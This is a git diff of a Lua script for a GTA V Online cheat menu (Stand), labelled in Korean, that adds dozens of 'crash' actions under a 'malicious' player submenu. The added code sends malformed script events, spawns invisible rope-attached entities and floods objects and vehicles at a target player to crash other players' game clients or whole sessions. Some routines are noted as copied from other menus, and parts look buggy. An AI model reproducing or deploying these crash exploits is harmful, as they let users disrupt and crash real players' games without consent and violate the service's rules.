@@ -10,7 +10,7 @@ util.require_natives(1663599433)
 util.toast("Ryze 스크립트에 오신 걸 환영합니다!")
 util.toast("스크립트 로딩중. (1-2s)")
 local response = false
-local localVer = 3.812
+local localVer = 3.85
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -280,13 +280,13 @@ local fun = menu.list(menu.my_root(), "전환", {}, "심심하면 잠깐 놀아�
 local misc = menu.list(menu.my_root(), "기타", {}, "유용하고 빠른 지름길")
 
 players.on_join(function(player_id)
-    menu.divider(menu.player_root(player_id), "라이제 문자")
-    local ryzescriptd = menu.list(menu.player_root(player_id), "라이제 문자")
+    menu.divider(menu.player_root(player_id), "라이즈 스크립트")
+    local ryzescriptd = menu.list(menu.player_root(player_id), "라이즈 스크립트")
     local malicious = menu.list(ryzescriptd, "악의가 있는")
     local trolling = menu.list(ryzescriptd, "트롤러")
     local friendly = menu.list(ryzescriptd, "우호적인")
     local vehicle = menu.list(ryzescriptd, "차량")
-
+    local otherc = menu.list(ryzescriptd, "기타")
 
 
 
@@ -988,9 +988,47 @@ players.on_join(function(player_id)
     --    end)
     --end)
 
-    menu.divider(crashes, "(배타적)")
+    menu.divider(crashes, "(세션)")
 
-    menu.action(crashes, "말할 수 없는", {"crashv2"}, "펑션 (인기 메뉴 - 스탠드)", function()
+    menu.action(crashes, "충돌 세션 V1 'Test'", {}, "", function(on_loop)
+        PHYSICS.ROPE_LOAD_TEXTURES()
+        local hashes = {2132890591, 2727244247}
+        local pc = players.get_position(player_id)
+        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
+        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
+        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
+        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
+        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
+        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
+        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
+        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
+        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
+        util.yield(1000)
+        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
+        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
+        PHYSICS.DELETE_CHILD_ROPE(rope)
+        PHYSICS.ROPE_UNLOAD_TEXTURES()
+    end)
+
+    menu.action(crashes, "충돌 세션 V2 'Test'", {}, "", function(on_loop)
+        PHYSICS.ROPE_LOAD_TEXTURES()
+        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
+        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
+        pos.x = pos.x+5
+        ppos.z = ppos.z+1
+        cargobob = entities.create_vehicle(2132890591, pos, 0)
+        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
+        kur = entities.create_ped(26, 2727244247, ppos, 0)
+        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
+        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
+        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
+        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
+    end)
+
+
+    menu.divider(crashes, "(라이즈 익스클루시보)")
+
+    menu.action(crashes, "말할 수 없는", {"crashv2"}, "푼칸도 (Menus populares - Stand)", function()
         for i = 1, 150 do
             util.trigger_script_event(1 << player_id, {0xA4D43510, player_id, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
             math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
@@ -1019,7 +1057,10 @@ players.on_join(function(player_id)
 
     local twotake = menu.list(crashes, "2T1 크래쉬", {}, "")
 
-    menu.action(twotake, "잘못된 모델 V1", {"crashv4"}, "", function()
+    local modelc = menu.list(twotake, "모델 충돌", {}, "")
+
+
+    menu.action(modelc, "모델로 인발리도 V1", {"crashv4"}, "", function()
         BlockSyncs(player_id, function()
             local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
@@ -1093,6 +1134,243 @@ players.on_join(function(player_id)
 
     end)
 
+    menu.action(modelc, "모델로 인발리도 V4", {"crashv12"}, "", function(on_toggle)
+        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
+            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+            for i = 0, 100 do 
+                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+            util.yield(10)
+            entities.delete_by_handle(Object_pizza2)
+            entities.delete_by_handle(Object_pizza2)
+            entities.delete_by_handle(Object_pizza2)
+            entities.delete_by_handle(Object_pizza2)
+            return
+        end
+    end)
+
+    menu.action(modelc, "임볼리도 모델 V5", {"crashv18"}, "X-force는 막을수 없습니다.", function()
+        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+		local pos = players.get_position(player_id)
+		local mdl = util.joaat("u_m_m_jesus_01")
+		local veh_mdl = util.joaat("oppressor")
+		util.request_model(veh_mdl)
+        util.request_model(mdl)
+			for i = 1, 10 do
+				if not players.exists(player_id) then
+					return
+				end
+				local veh = entities.create_vehicle(veh_mdl, pos, 0)
+				local jesus = entities.create_ped(2, mdl, pos, 0)
+				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
+				util.yield(100)
+				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
+				util.yield(1000)
+				entities.delete_by_handle(jesus)
+				entities.delete_by_handle(veh)
+			end
+		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
+		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
+    end)
+
+
+    menu.action(modelc, "임볼리도 모델 V6", {"crashv19"}, "X-force는 막을수 없습니다.", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            end
+            util.yield()
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            end
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+    end)
+
+    menu.action(modelc, "임볼리도 모델 V7", {"crashv26"}, "X-force는 막을수 없습니다.", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
+            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
+            end
+            util.yield()
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, player_id, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
+            end
+            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
+    end)
+
+    menu.action(modelc, "임볼리도 모델 V8 'Test (1 use)'", {"crashv27"}, "X-force는 막을수 없습니다. (Big CHUNGUS)", function()
+        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+        local pos = players.get_position(player_id)
+        local mdl = util.joaat("A_C_Cat_01")
+        local mdl2 = util.joaat("U_M_Y_Zombie_01")
+        local veh_mdl = util.joaat("insurgent2")
+        local veh_mdl2 = util.joaat("brawler")
+        util.request_model(veh_mdl)
+        util.request_model(veh_mdl2)
+        util.request_model(mdl)
+        util.request_model(mdl2)
+        for i = 1, 250 do
+            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
+            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
+            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
+            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
+            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
+
+            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
+
+            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
+
+            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
+            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
+
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
+
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
+            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
+            util.yield(100)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
+
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
+
+
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
+            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
+            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
+            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
+            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
+            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
+            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
+        end
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
+		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
+        entities.delete_by_handle(mdl)
+        entities.delete_by_handle(mdl2)
+        entities.delete_by_handle(veh_mdl)
+        entities.delete_by_handle(veh_mdl2)
+    end)
+
+    local netc = menu.list(twotake, "크라셰스 데 레드", {}, "")
+
+    -- Skidded from keramist.
+
+    menu.action(netc, "크라세오스 드 레드 V1", {"crashv13"}, "", function(on_toggle)
+        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
+        local vehicles = {}
+        for i = 1, 4 do
+            util.create_thread(function()
+                request_model(hashes[i])
+                local pcoords = players.get_position(player_id)
+                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
+                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
+                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
+                for j = 0, 49 do
+                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
+                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
+                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
+                end
+                for j = 0, 20 do
+                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
+                end
+                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
+                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
+                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
+                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
+                for ai = 1, 50 do
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
+                    pcoords = players.get_position(player_id)
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
+                    util.yield()
+                end
+                vehicles[#vehicles+1] = veh
+            end)
+        end
+        util.yield(2000)
+        for _, v in pairs(vehicles) do
+            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
+            entities.delete_by_handle(v)
+        end
+    end)
+
+    menu.action(netc, "크라세오스 드 레드 V2", {"crashv14"}, "", function(on_loop)
+        local cord = players.get_position(player_id)
+        local a1 = entities.create_object(-930879665, cord)
+        local a2 = entities.create_object(3613262246, cord)
+        local b1 = entities.create_object(452618762, cord)
+        local b2 = entities.create_object(3613262246, cord)
+        for i = 1, 10 do
+            util.request_model(-930879665)
+            util.yield(10)
+            util.request_model(3613262246)
+            util.yield(10)
+            util.request_model(452618762)
+            util.yield(300)
+            entities.delete_by_handle(a1)
+            entities.delete_by_handle(a2)
+            entities.delete_by_handle(b1)
+            entities.delete_by_handle(b2)
+            util.request_model(452618762)
+            util.yield(10)
+            util.request_model(3613262246)
+            util.yield(10)
+            util.request_model(-930879665)
+            util.yield(10)
+        end
+        util.toast("Terminado.")
+    end)
+
     local scrcrash = menu.list(twotake, "스크립트 크래쉬", {}, "")
 
     menu.action(scrcrash, "스크립트 크래쉬 V1", {"crashv6"}, "", function()
@@ -1146,7 +1424,18 @@ players.on_join(function(player_id)
         util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
         util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
         util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-
+        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
+        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
+        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
+        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
+        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
+        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
+        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
+        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
+        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
+        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
     end)
 
     menu.action(scrcrash, "스크립트 크래쉬 V3", {"crashv8"}, "그것은 잘 작동하지 않는다", function()
@@ -1336,6 +1625,80 @@ players.on_join(function(player_id)
             util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
     end)
 
+    menu.action(scrcrash, "스크립트 크래쉬 V6", {"crashv15"}, "몰라, 그냥 시도. \n인기 메뉴에 의해 차단됨", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            end
+            util.yield()
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
+            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+            end
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
+            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
+            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
+    end)
+
+    menu.action(scrcrash, "스크립트 크래쉬 V7", {"crashv16"}, "De 2take1", function()
+        for i = 1, 50 do
+            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
+            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
+            util.trigger_script_event(1 << player_id, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
+        end
+    end)
+
+    menu.action(scrcrash, "스크립트 크래쉬 V8", {"crashv17"}, "2take1(크래시 폴더)에서\nBlocked by 덜 인기 있는", function()
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 17302, 9822, 1999, 6777888, 111222})
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 2327, 0, 0, 0, -307, 27777})
+        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2327, 0, 0, 0, -307, 27777})
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 27983, 7601, 1020, 3209051, 111222})
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 1010, 0, 0, 0, -2653, 50555})
+        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 1111, 0, 0, 0, -5621, 57766})
+        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, -3, -90, -123, -9856, -97652})
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, -3, -90, -123, -9856, -97652})
+        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -3, -90, -123, -9856, -97652})
+        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 20547, 1058, 1245, 2721936, 666333})
+        util.yield(25)
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 20547, 1058, 1245, 2721936, 666333})
+        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, 20547, 1058, 1245, 2721936, 666333})
+        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, -152, -123, -978, 0, 0, 1, 0, -167, -144})
+        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 152, 123, 978, 0, 0, 1, 0, 167, 144})
+        util.trigger_script_event(1 << player_id, {1249026189, 0, 0, 97587, 5697, 3211, 8237539, 967853})
+        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 1967})
+        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, -123, -957, -14, -1908, -123})
+        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 12121, 9756, 7609, 1111111, 789666})
+        util.trigger_script_event(1 << player_id, {315658550, 0, 0, 87111, 5782, 9999, 3333333, 888888})
+        util.trigger_script_event(1 << player_id, {-877212109, 0, 0, 87111, 5782, 9999, 3333333, 888888})
